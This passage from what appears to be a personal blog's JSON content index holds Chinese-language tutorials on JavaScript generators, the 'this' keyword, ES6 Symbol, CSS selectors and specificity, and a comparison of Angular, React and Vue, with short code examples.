ag.throw() // bg.next() // c 上面代码中，g.throw方法被捕获以后，自动执行了一次next方法，所以会打印b。另外，也可以看到，只要 Generator 函数内部部署了try...catch代码块，那么遍历器的throw方法抛出的错误，不影响下一次遍历。 这种函数体内捕获错误的机制，大大方便了对错误的处理。多个yield表达式，可以只用一个try...catch代码块来捕获错误。如果使用回调函数的写法，想要捕获多个错误，就不得不为每个函数内部写一个错误处理语句，现在只在 Generator 函数内部写一次catch语句就可以了。 一旦 Generator 执行过程中抛出错误，且没有被内部捕获，就不会再执行下去了。如果此后还调用next方法，将返回一个value属性等于undefined、done属性等于true的对象，即 JavaScript 引擎认为这个 Generator 已经运行结束了。123456789101112131415161718192021222324252627282930313233343536373839function* g() &#123; yield 1; console.log('throwing an exception'); throw new Error('generator broke!'); yield 2; yield 3;&#125;function log(generator) &#123; var v; console.log('starting generator'); try &#123; v = generator.next(); console.log('第一次运行next方法', v); &#125; catch (err) &#123; console.log('捕捉错误', v); &#125; try &#123; v = generator.next(); console.log('第二次运行next方法', v); &#125; catch (err) &#123; console.log('捕捉错误', v); &#125; try &#123; v = generator.next(); console.log('第三次运行next方法', v); &#125; catch (err) &#123; console.log('捕捉错误', v); &#125; console.log('caller done');&#125;log(g());// starting generator// 第一次运行next方法 &#123; value: 1, done: false &#125;// throwing an exception// 捕捉错误 &#123; value: 1, done: false &#125;// 第三次运行next方法 &#123; value: undefined, done: true &#125;// caller done 上面代码一共三次运行next方法，第二次运行的时候会抛出错误，然后第三次运行的时候，Generator 函数就已经结束了，不再执行下去了。 next()、throw()、return() 的共同点next()、throw()、return()这三个方法本质上是同一件事，可以放在一起理解。它们的作用都是让 Generator 函数恢复执行，并且使用不同的语句替换yield表达式。 next()是将yield表达式替换成一个值。1234567891011const g = function* (x, y) &#123; let result = yield x + y; return result;&#125;;const gen = g(1, 2);gen.next(); // Object &#123;value: 3, done: false&#125;gen.next(1); // Object &#123;value: 1, done: true&#125;// 相当于将 let result = yield x + y// 替换成 let result = 1; 上面代码中，第二个next(1)方法就相当于将yield表达式替换成一个值1。如果next方法没有参数，就相当于替换成undefined。 throw()是将yield表达式替换成一个throw语句。123gen.throw(new Error('出错了')); // Uncaught Error: 出错了// 相当于将 let result = yield x + y// 替换成 let result = throw(new Error('出错了')); return()是将yield表达式替换成一个return语句。gen.return(2); // Object {value: 2, done: true}// 相当于将 let result = yield x + y// 替换成 let result = return 2; 一些注意的点如果Generator函数已经return了，那么Generator函数就不会再执行下去了123456789function* generator()&#123; yield 1; return 2; yield 3;&#125;var gen = generator();gen.next();//&#123;value: 1, done: false&#125;gen.next();//&#123;value: 2, done: true&#125;gen.next();//&#123;value: undefined, done: true&#125; 上述代码，在第二次gen.next()执行之后，Generator函数就已经return，代表结束了，再进行下次gen.next()就不会输出3 如果yield的是一个函数，那这个函数会在value值里面，要调用只能通过value调用1234567function* generator()&#123; yield function f()&#123; console.log('f is called'); &#125;&#125;var gen = generator();gen.next().value();//f is called 参考：阮一峰《ECMAScript 6 入门》","categories":[{"name":"前端","slug":"前端","permalink":"https://recallhyx.github.io/categories/前端/"}],"tags":[{"name":"javascript","slug":"javascript","permalink":"https://recallhyx.github.io/tags/javascript/"}]},{"title":"Angular,React,Vue三大框架对比","slug":"Angular-React-Vue三大框架对比","date":"2018-03-04T13:56:38.000Z","updated":"2018-03-18T14:09:08.403Z","comments":true,"path":"2018/03/04/Angular-React-Vue三大框架对比/","link":"","permalink":"https://recallhyx.github.io/2018/03/04/Angular-React-Vue三大框架对比/","excerpt":"","text":"最近的面试遇到面试官问前端三大框架的区别，我实际开发只用过Angular2，没有用过其他框架，所以感觉很吃亏，作为一个前端，怎么能拘泥于一个框架呢？ 历史Angular 是基于 TypeScript 的 Javascript 框架。由 Google 进行开发和维护，它被描述为“超级厉害的 JavaScript MVW框架”。Angular（也被称为 “Angular 2+”，“Angular 2” 或者 “ng2”）已被重写，是与 AngularJS（也被称为 “Angular.js” 或 “AngularJS 1.x”）不兼容的后续版本。当 AngularJS（旧版本）最初于2010年10月发布时，仍然在修复 bug，等等 —— 新的 Angular（sans JS）于 2016 年 9 月推出版本 2。最新的主版本是 4，因为版本 3 被跳过了。Google，Vine，Wix，Udemy，weather.com，healthcare.gov 和 Forbes 都使用 Angular。 React 被描述为 “用于构建用户界面的 JavaScript 库”。React 最初于 2013 年 3 月发布，由 Facebook 进行开发和维护，Facebook 在多个页面上使用 React 组件（但不是作为单页应用程序）。根据 Chris Cordle 这篇文章的统计，React 在 Facebook 上的使用远远多于 Angular 在 Google 上的使用。React 还被 Airbnb，Uber，Netflix，Twitter，Pinterest，Reddit，Udemy，Wix，Paypal，Imgur，Feedly，Stripe，Tumblr，Walmart 等使用 Vue 是 2016 年发展最为迅速的 JS 框架之一。Vue 将自己描述为一款“用于构建直观，快速和组件化交互式界面的 MVVM 框架”。它于 2014 年 2 月首次由 Google 前员工 Evan You 发布（顺便说一句：尤雨溪那时候发表了一篇 vue 发布首周的营销活动和数据的博客文章）。尤其是考虑到 Vue 在没有大公司的支持的情况下，作为一个人开发的框架还能获得这么多的吸引力，这无疑是非常成功的。尤雨溪目前有一个包含数十名核心开发者的团队。2016 年，版本 2 发布。Vue 被阿里巴巴，百度，Expedia，任天堂，GitLab 使用 — 可以在 madewithvuejs.com 找到一些小型项目的列表。 这三大框架都有大公司在用，而且社区非常强大，所以不用担心短时间会被淘汰。 使用语言React 专注于使用 Javascript ES6。Vue 使用 Javascript ES5 或 ES6。Angular 依赖于 TypeScript。TypeScript其实是 JavaScript 的超集，如果对 JavaScript 熟练的话，上手 TypeScript也不是什么很大的问题，而且 TypeScript 会最终编译成 JavaScript ES5，也能在其他浏览器正常运行 JSX 和 HTMLReact 打破了长期以来的最佳实践。几十年来，开发人员试图分离 UI 模板和内联的 Javascript 逻辑，但是使用 JSX，这些又被混合了。这听起来很糟糕，但是你应该听彼得·亨特（Peter Hunt）的演讲 “React：反思最佳实践”（2013 年 10 月）。他指出，分离模板和逻辑仅仅是技术的分离，而不是关注的分离。你应该构建组件而不是模板。组件是可重用的、可组合的、可单元测试的。 在 React 中，所有的组件的渲染功能都依靠 JSX。JSX 是使用 XML 语法编写 JavaScript 的一种语法糖。 JSX 是一个类似 HTML 语法的可选预处理器，并随后在 JavaScript 中进行编译。JSX 有一些怪癖 —— 例如，你需要使用 className 而不是 class，因为后者是 Javascript 的保留字。JSX 对于开发来说是一个很大的优势，因为代码写在同一个地方，可以在代码完成和编译时更好地检查工作成果。当你在 JSX 中输入错误时，React 将不会编译，并打印输出错误的行号。Angular 2 在运行时静默失败（如果使用 Angular 中的预编译，这个参数可能是无效的）。 JSX 意味着 React 中的所有内容都是 Javascript – 用于JSX模板和逻辑。Cory House 在 2016 年 1 月的文章 中指出：“Angular 2 继续把 ‘JS’ 放到 HTML 中。React 把 ‘HTML’ 放到 JS 中。“这是一件好事，因为 Javascript 比 HTML 更强大。 Angular 模板使用特殊的 Angular 语法（比如 ngIf 或 ngFor）来增强 HTML。虽然 React 需要 JavaScript 的知识，但 Angular 会迫使你学习 Angular 特有的语法。 Vue 具有“单个文件组件”。这似乎是对于关注分离的权衡 - 模板，脚本和样式在一个文件中，但在三个不同的有序部分中。这意味着你可以获得语法高亮，CSS 支持以及更容易使用预处理器（如 Jade 或 SCSS）。JSX 更容易调试，因为 Vue 不会显示不规范 HTML 的语法错误。这是不正确的，因为 Vue 转换 HTML 来渲染函数 - 所以错误显示没有问题。 更抽象一点来看，我们可以把组件区分为两类：一类是偏视图表现的 (presentational)，一类则是偏逻辑的 (logical)。我们推荐在前者中使用模板，在后者中使用 JSX 或渲染函数。这两类组件的比例会根据应用类型的不同有所变化，但整体来说我们发现表现类的组件远远多于逻辑类组件。 状态管理和数据绑定构建用户界面很困难，因为处处都有状态 - 随着时间的推移而变化的数据带来了复杂性。定义的状态工作流程对于应用程序的增长和复杂性有很大的帮助。对于复杂度不大的应用程序，就不必定义的状态流了，像原生 JS 就足够了。 它是如何工作的？组件在任何时间点描述 UI。当数据改变时，框架重新渲染整个 UI 组件 - 显示的数据始终是最新的。我们可以把这个概念称为“ UI 即功能”。 React 经常与 Redux 在一起使用。Redux 以三个基本原则来自述： 单一数据源（Single source of truth） State 是只读的（State is read-only） 使用纯函数执行修改（Changes are made with pure functions） 换句话说：整个应用程序的状态存储在单个 store 的状态树中。这有助于调试应用程序，一些功能更容易实现。状态是只读的，只能通过 action 来改变，以避免竞争条件（这也有助于调试）。编写 Reducer 来指定如何通过 action 来转换 state。 大多数教程和样板文件都已经集成了 Redux，但是如果没有它，你可以使用 React（你可能不需要在你的项目中使用 Redux）。Redux 在代码中引入了复杂性和相当强的约束。如果你正在学习React，那么在你要使用 Redux 之前，你应该考虑学习纯粹的 React。你绝对应该阅读 Dan Abramov 的“你可能不需要 Redux”。 有些开发人员 建议使用 Mobx 代替 Redux。你可以把它看作是一个 “自动的 Redux”，这使得事情一开始就更容易使用和理解。如果你想了解，你应该从介绍开始。你也可以阅读 Robin 的 Redux 和 MobX 的比较。他还提供了有关从 Redux 迁移到 MobX 的信息。如果你想查找其他 Flux 库，这个列表非常有用。如果你是来自 MVC 的世界，那么你应该阅读 Mikhail Levkovsky 的文章“Redux 中的思考（当你所知道的是 MVC）”。 Vue 可以使用 Redux，但它提供了 Vuex 作为自己的解决方案。 React 和 Angular 之间的巨大差异是 单向与双向绑定。当 UI 元素（例如，用户输入）被更新时，Angular 的双向绑定改变 model 状态。React 只有一种方法：先更新 model，然后渲染 UI 元素。Angular 的方式实现起来代码更干净，开发人员更容易实现。React 的方式会有更好的数据总览，因为数据只能在一个方向上流动（这使得调试更容易）。 这两个概念各有优劣。你需要了解这些概念，并确定这是否会影响你选择框架。文章“双向数据绑定：Angular 2 和 React”和这个 Stackoverflow 上的问题都提供了一个很好的解释。在这里你可以找到一些交互式的代码示例（3 年前的示例（，只适用于 Angular 1 和 React）。最后，Vue 支持单向绑定和双向绑定（默认为单向绑定）。 如果你想进一步阅读，这有一篇长文，是有关状态的不同类型和 Angular 应用程序中的状态管理（Victor Savkin）。 学习曲线要学习 Vue，你只需要有良好的 HTML 和 JavaScript 基础。有了这些基本的技能，你就可以非常快速地通过阅读 指南 投入开发。 Angular 的学习曲线是非常陡峭的——作为一个框架，它的 API 面积比起 Vue 要大得多，你也因此需要理解更多的概念才能开始有效率地工作。当然，Angular 本身的复杂度是因为它的设计目标就是只针对大型的复杂应用；但不可否认的是，这也使得它对于经验不甚丰富的开发者相当的不友好。 在调试方面，React 和 Vue 的黑魔法更少是一个加分项。找出 bug 更容易，因为需要看的地方少了，堆栈跟踪的时候，自己的代码和那些库之间有更明显的区别。使用 React 的人员报告说，他们永远不必阅读库的源代码。但是，在调试 Angular 应用程序时，通常需要调试 Angular 的内部来理解底层模型。从好的一面来看，从 Angular 4 开始，错误信息应该更清晰，更具信息性。 总结Vue 更像是 Angular2 和 React 的集合，这并不奇怪，Vue充分吸收了 Angular2 和 React 这两位前辈的优点和长处，并不断运用在自身，也难怪 Vue 在 Github 上 star数越来越多 参考[译] 2017 年比较 Angular、React、Vue 三剑客对比其他框架","categories":[{"name":"前端","slug":"前端","permalink":"https://recallhyx.github.io/categories/前端/"}],"tags":[{"name":"Angular-React-Vue","slug":"Angular-React-Vue","permalink":"https://recallhyx.github.io/tags/Angular-React-Vue/"}]},{"title":"CSS 都有哪些选择器？","slug":"CSS选择器","date":"2018-02-20T03:55:46.000Z","updated":"2018-03-18T14:09:09.756Z","comments":true,"path":"2018/02/20/CSS选择器/","link":"","permalink":"https://recallhyx.github.io/2018/02/20/CSS选择器/","excerpt":"","text":"什么是选择器CSS有一套用于描述其语言的术语。123div &#123; color: red;&#125; 在CSS的术语中，上面这段代码被称为一条规则（rule）。这条规则以选择器 div 开始，它选择要在DOM中哪些元素上使用这条规则。 选择器介绍标签选择器（类型选择器）123div &#123; color: red;&#125; 上述代码就是标签选择器，选择所有div标签。因为div是一个标签，在CSS规范中称为类型选择器。 类选择器123.name &#123; color: red;&#125; 通过 . 来指定一个类上述代码就是选择所有标签内有class=&quot;name&quot;的标签，注意，如果被选择的标签内还有子标签，且没有被其他选择器选中，则样式会保持默认。12345678910111213141516&lt;!DOCTYPE html&gt;&lt;html lang=\"zh-cmn-Hans\"&gt;&lt;head&gt;&lt;meta charset=\"utf-8\" /&gt;&lt;title&gt;类型选择器&lt;/title&gt;&lt;style&gt;.title &#123; font-size: 30px;&#125;&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;p class=\"title\"&gt;标题&lt;p&gt;正文内容&lt;/p&gt;&lt;p&gt;&lt;p&gt;多类选择符的使用&lt;/p&gt;&lt;/body&gt;&lt;/html&gt; 效果如下 接下来我们把 title的 font-size改为20px，然后加上123.content &#123; font-size: 30px;&#125; 再在&lt;p&gt;正文内容&lt;/p&gt;内加上类content，即下面代码1234567891011121314151617181920&lt;!DOCTYPE html&gt;&lt;html lang=\"zh-cmn-Hans\"&gt;&lt;head&gt;&lt;meta charset=\"utf-8\" /&gt;&lt;title&gt;类型选择器&lt;/title&gt;&lt;style&gt;.title &#123; font-size: 20px;&#125;.content &#123; font-size: 30px;&#125;&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;p class=\"title\"&gt;标题&lt;p class=\"content\"&gt;正文内容&lt;/p&gt;&lt;/p&gt;&lt;p&gt;多类选择符的使用&lt;/p&gt;&lt;/body&gt;&lt;/html&gt; 效果如下 可以看到，嵌套在子标签里面的类优先匹配了content规则我们再改一下123.content.note &#123; color:red;&#125; 1&lt;p class=\"content note\"&gt;多类选择符的使用&lt;/p&gt; 这时，两个规则同时作用在多类选择符的使用上，即匹配同时具有content和note的元素，如果元素只有其中一个类，那这个规则不会匹配到这个元素，这就是多类选择器如果不同的类选择器作用在同一个元素上，则样式会叠加1234567891011121314151617181920&lt;!DOCTYPE html&gt;&lt;html lang=\"zh-cmn-Hans\"&gt;&lt;head&gt;&lt;meta charset=\"utf-8\" /&gt;&lt;title&gt;类型选择器&lt;/title&gt;&lt;style&gt;.title &#123; font-size: 20px;&#125;.content &#123; color: red;&#125;&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;p class=\"title\"&gt;标题&lt;p &gt;正文内容&lt;/p&gt;&lt;/p&gt;&lt;p class=\"title content\"&gt;多类选择符的使用&lt;/p&gt;&lt;/body&gt;&lt;/html&gt; 其中，多类选择符的使用同时具有title和content的样式。注意，如果定义了的规则，CSS改变的是同一个样式，则后定义的规则会覆盖前面的规则。1234567891011121314151617181920&lt;!DOCTYPE html&gt;&lt;html lang=\"zh-cmn-Hans\"&gt;&lt;head&gt;&lt;meta charset=\"utf-8\" /&gt;&lt;title&gt;类型选择器&lt;/title&gt;&lt;style&gt;.title &#123; color: green;&#125;.content &#123; color: red;&#125;&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;p class=\"title\"&gt;标题&lt;p &gt;正文内容&lt;/p&gt;&lt;/p&gt;&lt;p class=\"title content\"&gt;多类选择符的使用&lt;/p&gt;&lt;/body&gt;&lt;/html&gt; 这里，虽然多类选择符的使用这个p标签同时有title和content两个规则，但是由于content是在之后定义的，所以content生效。 id选择器123#name&#123; color: red;&#125; 通过#来指定一个id 通过设置元素的 id 属性为该元素制定ID。ID名由开发者指定。每个ID在文档中必须是唯一的。 上述只是规范，因为你可以设置多个一样的id，而且浏览器不报错，但是，你只能通过getElementById()的方法获得第一个符合id的元素，而不能获得全部符合id的元素，这是不推荐的。12345678910111213141516171819&lt;!DOCTYPE html&gt;&lt;html lang=\"zh-cmn-Hans\"&gt;&lt;head&gt;&lt;meta charset=\"utf-8\" /&gt;&lt;title&gt;id选择器&lt;/title&gt;&lt;style&gt;#subtitle &#123; color: red;&#125;#content &#123; color: blue;&#125;&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;h1 id=\"subtitle\"&gt;标题&lt;/h1&gt;&lt;p id=\"content\"&gt;正文内容&lt;/p&gt;&lt;/body&gt;&lt;/html&gt; 注意，id选择器不能在同个元素上定义多个，比如id=&quot;a b&quot;就是错误的写法。 伪类选择器和伪元素选择器（伪对象选择器）CSS伪类（pseudo-class）是加在选择器后面的用来指定元素状态的关键字。比如，:hover。CSS伪类适用于用户使用指示设备虚指一个元素（没有激活它）的情况。这个样式会被任何与链接相关的伪类重写，像:link, :visited, 和 :active等。为了确保生效，:hover规则需要放在:link和:visited规则之后，但是在:active规则之前，按照LVHA的循顺序声明:link－:visited－:hover－:active。”) 会在鼠标悬停在选中元素上时应用相应的样式。 伪类选择器列表： 选择器 版本 描述 E:link CSS1 设置超链接a在未被访问前的样式。 E:visited CSS1 设置超链接a在其链接地址已被访问过时的样式。 E:hover CSS1/2 设置元素在其鼠标悬停时的样式。 E:active CSS1/2 设置元素在被用户激活（在鼠标点击与释放之间发生的事件）时的样式。 E:focus CSS1/2 设置元素在成为输入焦点（该元素的onfocus事件发生）时的样式。 E:lang(fr).htm) CSS2 匹配使用特殊语言的E元素。 E:not(s).htm) CSS3 匹配不含有s选择符的元素E。 E:root CSS3 匹配E元素在文档的根元素。 E:first-child CSS2 匹配父元素的第一个子元素E。 E:last-child CSS3 匹配父元素的最后一个子元素E。 E:only-child CSS3 匹配父元素仅有的一个子元素E。 E:nth-child(n).htm) CSS3 匹配父元素的第n个子元素E。 E:nth-last-child(n).htm) CSS3 匹配父元素的倒数第n个子元素E。 E:first-of-type CSS3 匹配同类型中的第一个同级兄弟元素E。 E:last-of-type CSS3 匹配同类型中的最后一个同级兄弟元素E。 E:only-of-type CSS3 匹配同类型中的唯一的一个同级兄弟元素E。 E:nth-of-type(n).htm) CSS3 匹配同类型中的第n个同级兄弟元素E。 E:nth-last-of-type(n).htm) CSS3 匹配同类型中的倒数第n个同级兄弟元素E。 E:empty CSS3 匹配没有任何子元素（包括text节点）的元素E。 E:checked CSS3 匹配用户界面上处于选中状态的元素E。(用于input type为radio与checkbox时) E:enabled CSS3 匹配用户界面上处于可用状态的元素E。 E:disabled CSS3 匹配用户界面上处于禁用状态的元素E。 E:target CSS3 匹配相关URL指向的E元素。 @page:first CSS2 设置页面容器第一页使用的样式。仅用于@page规则 @page:left CSS2 设置页面容器位于装订线左边的所有页面使用的样式。仅用于@page规则 @page:right CSS2 设置页面容器位于装订线右边的所有页面使用的样式。仅用于@page规则 伪元素选择器列表： 选择符 版本 描述 E:first-letter/E::first-letter CSS1/3 设置对象内的第一个字符的样式。 E:first-line/E::first-line CSS1/3 设置对象内的第一行的样式。 E:before/E::before CSS2/3 设置在对象前（依据对象树的逻辑结构）发生的内容。用来和content属性一起使用 E:after/E::after CSS2/3 设置在对象后（依据对象树的逻辑结构）发生的内容。用来和content属性一起使用 E::placeholder CSS3 设置对象文字占位符的样式。 E::selection CSS3 设置对象被选择时的颜色。 CSS3将伪元素选择器(Pseudo-Element Selectors)前面的单个冒号(:)修改为双冒号(::)用以区别伪类选择器(Pseudo-Classes Selectors)，但以前的写法仍然有效。 伪类和伪元素（pseudo-elements）不仅可以让你为符合某种文档树结构的元素指定样式，还可以为符合某些外部条件的元素指定样式：浏览历史(比如是否访问过 (:visited)， 内容状态(如 :checked CSS 伪类选择器表示任何处于选中状态的radio(), checkbox () 或(&quot;select&quot;) 元素中的option HTML元素(&quot;option&quot;)) 。用户通过点击元素或选择其他的值，可以改变该元素的 :checked 状态，并:checked属性赋给一个新的对象(例如其他的option值)。”) ), 鼠标位置 (如:hover). 关系选择器 选择器 名称 版本 描述 E F 包含选择器(Descendant combinator) CSS1 选择所有被E元素包含的F元素。 E&gt;F 子选择器(Child combinator) CSS2 选择所有作为E元素的子元素F。 E+F 相邻选择器(Adjacent sibling combinator) CSS2 选择紧贴在E元素之后F元素。 E~F 兄弟选择器(General sibling combinator) CSS3 选择E元素所有兄弟元素F。 属性选择器 选择器 版本 描述 E[att] CSS2 选择具有att属性的E元素。 E[att=”val”] CSS2 选择具有att属性且属性值等于val的E元素。 E[att~=”val”] CSS2 选择具有att属性且属性值为一用空格分隔的字词列表，其中一个等于val的E元素。 E[att^=”val”] CSS3 选择具有att属性且属性值为以val开头的字符串的E元素。 E[att$=”val”] CSS3 选择具有att属性且属性值为以val结尾的字符串的E元素。 E[att*=”val”] CSS3 选择具有att属性且属性值为包含val的字符串的E元素。 E[att&#124;=”val”] CSS2 选择具有att属性且属性值为以val开头并用连接符”-“分隔的字符串的E元素，如果属性值仅为val，也将被选择。 选择器优先级算法如果多于一个规则指定了相同的属性值都应用到一个元素上，CSS规定拥有更高确定度的选择器优先级更高。ID选择器比类选择器更具确定度, 而类选择器比标签选择器更具确定度。下面是利用权重的方式来计算优先级： 最高优先级是 (直接在标签中的设置样式，假设级别为1000) 次优先级是（ID选择器 ,假设级别为100） #myDiv{color:Red;} 其次优先级是（类选择器，假设级别为10） .divClass{color:Red;} 最后优先级是 （标签选择器，假设级别是 1） div{color:Red;}全局选择器(*), 以及组合选择器(+, &gt; ~),和:not选择器对权重没有影响。（但是，在 :not() 内部声明的选择器是会影响优先级）。 还有一种优先级算法： 1.优先级就近原则，同权重情况下样式定义最近者为准;2.载入样式以最后载入的定位为准;3.!important &gt; id &gt; class &gt; tag4.important 比 内联优先级高，但内联比 id 要高 使用 !important 是一个坏习惯，应该尽量避免，因为这破坏了样式表中的固有的级联规则 使得调试找bug变得更加困难了。当两条相互冲突的带有 !important 规则的声明被应用到相同的元素上时，拥有更大优先级的声明将会被采用。 一些经验法则： 一定要优化考虑使用样式规则的优先级来解决问题而不是 !important 只有在需要覆盖全站或外部 css（例如引用的 ExtJs 或者 YUI ）的特定页面中使用 !important 永远不要在全站范围的 css 上使用 !important 永远不要在你的插件中使用 !important 参考:MDN web docscss参考手册","categories":[{"name":"前端","slug":"前端","permalink":"https://recallhyx.github.io/categories/前端/"}],"tags":[{"name":"css","slug":"css","permalink":"https://recallhyx.github.io/tags/css/"}]},{"title":"JavaScript this的用法","slug":"this的用法","date":"2018-02-14T13:25:45.000Z","updated":"2018-02-14T13:31:22.955Z","comments":true,"path":"2018/02/14/this的用法/","link":"","permalink":"https://recallhyx.github.io/2018/02/14/this的用法/","excerpt":"","text":"this介绍this 是 JavaScript 的关键字之一，用法灵活，也是很多 web 前端面试题会出的，不过总结起来就一句话：this指的是，调用函数的那个对象 this 取值的四种情况构造函数的调用所谓构造函数，就是通过这个函数生成一个新对象（object）。这时，this就指这个新对象。123456var name = \"hyx\";function Name()&#123; this.name = \"Recall\";&#125;var person = new Name();person.name;// \"Recall\" 可以看到，this 指向新对象 person 而不是全局变量 window 这与我们的总结是一致的如果不是使用 new Name()的方法而是直接调用，即 Name()，结果会不一样，因为这不是构造函数调用 普通函数的调用这是函数的最通常用法，属于全局性调用，因此this就代表全局对象 window。123456var name = \"hyx\";function Name()&#123; this.name = \"Recall\";&#125;Name();console.log(name); // Recall 上面就是直接调用，可以看到全局变量 name 被改变了（从hyx-&gt;Recall），说明this指向的是全局变量 window· call 和 apply 的调用当一个函数被 call 和 apply 调用时，this 的值就取传入的对象的值。call 和 apply 的用法类似，只不过传入参数不一样。fun.call(thisObj[, arg1[, arg2[, ...]]])call()可以接收任意个数的参数，其中第一个必须是一个 this 对象，其余依次是所有的参数。如果没有提供 thisObj 参数，那么全局对象被用作 thisObj。 fun.apply(thisObj, [argsArray])apply() 方法接受两个参数第一个是函数运行的作用域，另外一个是一个参数数组(arguments)。如果没有提供 thisObj 和 argsArray 任何一个参数，那么全局对象将被用作 thisObj， 并且无法被传递任何参数。12345678 var x = 10; function test()&#123; alert(this.x); &#125; var o=&#123;&#125;; o.x = 1; o.m = test; o.m.apply(); //10 这段代码，对象 o 有两个属性，x 和 m，其中，x 的值为 1，m 的值为函数 test，o.m.apply() 不传任何参数，则默认this 为全局对象 window，所以 x 的值就是代码第一行声明赋值的 10如果把最后一行代码修改为1o.m.apply(o); //1 运行结果就变成了1，证明了这时 this 代表的是对象 o。 作为对象方法的调用这才是重中之重，如果函数作为对象的一个属性时，并且作为对象的一个属性被调用时，函数中的 this 指向该对象。我们先看个例子1234567891011var name = 'hyx';var person = &#123; name : 'Recall', fn : function()&#123; console.log(this); console.log(this.name); &#125;&#125;person.fn()//&#123;name: \"Recall\", fn: ƒ&#125;//Recall 上述代码中，是 person 调用的 fn 方法，所以 this 指向 person注意：以下两种情况，this 指向全局对象 window第一种，函数不作为对象的属性而被调用123456789101112var name = 'hyx';var person = &#123; name : 'Recall', fn : function()&#123; console.log(this); console.log(this.name); &#125;&#125;var fn = person.fn;fn();// window &#123;...&#125;// hyx 第二种，在一个对象的函数内再声明的这个函数1234567891011121314var name = 'hyx';var person = &#123; name : 'Recall', fn : function()&#123; function fn2()&#123; console.log(this); console.log(this.name); &#125; fn2(); &#125;&#125;person.fn();// window &#123;...&#125;// hyx 正常来说，按照我们的总结，即 this指的是，调用函数的那个对象，来说，this.name 应该输出 Recall ，但却输出的是 hyx ，而且我们可以看到 this 的值是全局对象 window。这是语言设计上的一个错误。倘若语言设计正确，那么当内部函数被调用时，this 应该仍然绑定到外部函数的 this 变量。这个设计错误的后果是方法不能利用内部函数来帮助它工作。ECMAScript6 的箭头函数（注意只是箭头函数）基本纠正了这个设计上的错误（注意只是基本上，但不是彻底地纠正了错误）1234567891011121314var name = 'hyx';var person = &#123; name : 'Recall', fn : function()&#123; fn2 = ()=&gt;&#123; console.log(this); console.log(this.name); &#125; fn2(); &#125;&#125;person.fn();// &#123;name: \"Recall\", fn: ƒ&#125;// hyx 我们可以看一下箭头函数转换成 ES5 是怎样做的123456789101112131415var name = 'hyx';var person = &#123; name : 'Recall', fn : function()&#123; var _this = this; fn2 = function()&#123; console.log(_this); console.log(_this.name); &#125; fn2(); &#125;&#125;person.fn();// &#123;name: \"Recall\", fn: ƒ&#125;// Recall 总结this 的用法是我刷面试题的时候遇到的，一开始挺头疼的，不知道什么时候指向全局对象，什么时候指向调用对象，加上 JavaScript 设计上的缺陷就更头晕了，所以花了一个下午专门做了笔记，希望能有效果。注意：全局对象，在浏览器是 window ，在 node 是 Global 参考深入理解javascript原型和闭包（10）——thisJavaScript this 总结（含 ES6）Javascript的this用法","categories":[{"name":"前端","slug":"前端","permalink":"https://recallhyx.github.io/categories/前端/"}],"tags":[{"name":"javascript","slug":"javascript","permalink":"https://recallhyx.github.io/tags/javascript/"}]},{"title":"JavaScript ES6一些有用的语法特性(Symbol、Set 和 Map)","slug":"ES6（3）","date":"2018-02-07T03:16:15.000Z","updated":"2018-02-08T06:39:24.959Z","comments":true,"path":"2018/02/07/ES6（3）/","link":"","permalink":"https://recallhyx.github.io/2018/02/07/ES6（3）/","excerpt":"","text":"Symbol—使用方法，Symbol.for()、Symbol.keyFor()使用方法ES6 引入了一种新的原始数据类型Symbol，表示独一无二的值。它是 JavaScript 语言的第七种数据类型，前六种是：undefined、null、布尔值（Boolean）、字符串（String）、数值（Number）、对象（Object）。 Symbol 值通过Symbol函数生成。这就是说，对象的属性名现在可以有两种类型，一种是原来就有的字符串，另一种就是新增的 Symbol 类型。凡是属性名属于 Symbol 类型，就都是独一无二的，可以保证不会与其他属性名产生冲突。1234let s = Symbol();typeof s// \"symbol\" 上面代码中，变量s就是一个独一无二的值。typeof运算符的结果，表明变量s是 Symbol 数据类型，而不是字符串之类的其他类型。 注意，Symbol函数前不能使用new命令，否则会报错。这是因为生成的 Symbol是一个原始类型的值，不是对象。也就是说，由于 Symbol 值不是对象，所以不能添加属性。基本上，它是一种类似于字符串的数据类型。 Symbol函数可以接受一个字符串作为参数，表示对 Symbol 实例的描述，主要是为了在控制台显示，或者转为字符串时，比较容易区分。12345678let s1 = Symbol('foo');let s2 = Symbol('bar');s1 // Symbol(foo)s2 // Symbol(bar)s1.toString() // \"Symbol(foo)\"s2.toString() // \"Symbol(bar)\" 上面代码中，s1和s2是两个 Symbol 值。如果不加参数，它们在控制台的输出都是Symbol()，不利于区分。有了参数以后，就等于为它们加上了描述，输出的时候就能够分清，到底是哪一个值。 如果 Symbol 的参数是一个对象，就会调用该对象的toString方法，将其转为字符串，然后才生成一个 Symbol 值。1234567const obj = &#123; toString() &#123; return 'abc'; &#125;&#125;;const sym = Symbol(obj);sym // Symbol(abc) 注意，Symbol函数的参数只是表示对当前 Symbol 值的描述，因此相同参数的Symbol函数的返回值是不相等的。1234567891011// 没有参数的情况let s1 = Symbol();let s2 = Symbol();s1 === s2 // false// 有参数的情况let s1 = Symbol('foo');let s2 = Symbol('foo');s1 === s2 // false 上面代码中，s1和s2都是Symbol函数的返回值，而且参数相同，但是它们是不相等的。 Symbol 值不能与其他类型的值进行运算，会报错。123456let sym = Symbol('My symbol');\"your symbol is \" + sym// TypeError: can't convert symbol to string`your symbol is $&#123;sym&#125;`// TypeError: can't convert symbol to string 但是，Symbol 值可以显式转为字符串。1234let sym = Symbol('My symbol');String(sym) // 'Symbol(My symbol)'sym.toString() // 'Symbol(My symbol)' 另外，Symbol 值也可以转为布尔值，但是不能转为数值。12345678910let sym = Symbol();Boolean(sym) // true!sym // falseif (sym) &#123; // ...&#125;Number(sym) // TypeErrorsym + 2 // TypeError Symbol.for()、Symbol.keyFor()有时，我们希望重新使用同一个 Symbol 值，Symbol.for方法可以做到这一点。它接受一个字符串作为参数，然后搜索有没有以该参数作为名称的 Symbol 值。如果有，就返回这个 Symbol 值，否则就新建并返回一个以该字符串为名称的 Symbol 值。1234let s1 = Symbol.for('foo');let s2 = Symbol.for('foo');s1 === s2 // true 上面代码中，s1和s2都是 Symbol 值，但是它们都是同样参数的Symbol.for方法生成的，所以实际上是同一个值。 Symbol.for()与Symbol()这两种写法，都会生成新的 Symbol。它们的区别是，前者会被登记在全局环境中供搜索，后者不会。Symbol.for()不会每次调用就返回一个新的 Symbol 